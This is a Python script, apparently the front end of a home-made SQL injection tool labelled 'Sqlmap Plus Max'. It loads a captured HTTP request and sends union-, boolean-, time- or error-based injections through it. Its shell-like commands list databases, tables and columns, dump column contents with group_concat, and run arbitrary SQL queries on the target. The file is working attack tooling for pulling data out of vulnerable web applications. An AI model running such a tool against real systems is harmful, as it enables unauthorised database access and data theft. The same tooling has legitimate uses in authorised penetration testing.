from sqli.payload import payload
from sqli.booli import Booli
from sqli.dump import dump
from sqli.uni import Uni
from sqli.timei import Timei
from sqli.erri import Erri
from util.read import read

http = read("payload.http")
dump = dump()
# inject = Erri(http)
# inject = Timei(http)
# inject = Booli(http, 'query_success')
inject = Uni(http)


def useSql():
    print('''
    Switch to SQL shell mode
    ''')
    while True:
        s = input('sql$ > ')
        ss = s.split(' ')
        if s == 'exit':
            print('''
    Back SQL shell mode
                ''')
            return
        elif len(ss) >= 4 and ss[0] == 'select' and ss[2] == 'from':
            ss[1] = ',0x3a,0x3a,'.join(ss[1].split(','))
            ss[1] = 'group_concat(' + ss[1] + ')'
            inject.get(' '.join(ss))

            # run = ',\'#\','.join(ss[1].split(','))
            # ss[1] = 'group_concat(' + run + ')'
            # print(run)
        else:
            inject.get(s)

# >=
print('''
Sqlmap Plus Max 0.1-preview.1
Copyright (c) ChenZhouWen.
https://comath.cn/
''')
path = '~'
col = ''
while True:
    shell = input('[%s] # ' % path).split()
    if len(shell) <= 1:
        if shell[0] == 'ls':
            paths = path.split('/')
            pathLen = len(paths)
            if pathLen == 1:
                result = inject.get(dump.dbs)
            elif pathLen == 2:
                result = inject.get(dump.tables.format(paths[1]))
            elif pathLen == 3:
                col = inject.get(dump.columns.format(paths[1], paths[2]))
        # 当前数据库
        elif shell[0] == 'db':
            result = inject.get(dump.db)
        elif shell[0] == 'exit':
            print('Bye ~')
            break
    else:
        # 所有表
        if shell[0] == 'ls':
            currSql = 'select(group_concat({0}))from({1})'
            paths = path.split('/')
            table = '.'.join(path.split('/')[1:3])
            if shell[1] == "*":
                col = inject.get(dump.columns.format(paths[1], paths[2]))
                inject.get(currSql.format(col.replace(',', ',0x3a,0x3a,'), table))
            else:
                inject.get(currSql.format(shell[1].replace(',', ',0x3a,0x3a,'), table))


        elif shell[0] == 'cd':
            if shell[1][0:2] == '..':
                path = '/'.join(path.split('/')[0:-1])
            elif shell[1] == '/' or shell[1] == '~':
                path = '~'
            elif shell[1][0:1] == '/':
                path = '~' + shell[1]
            elif len(path.split('/')) == 3:
                print('There is no next')
            else:
                path += '/' + shell[1]
        # open
        elif shell[0] == 'open':
            inject.get(read(shell[1]))
        # use
        elif shell[0] == 'use':
            useSql()
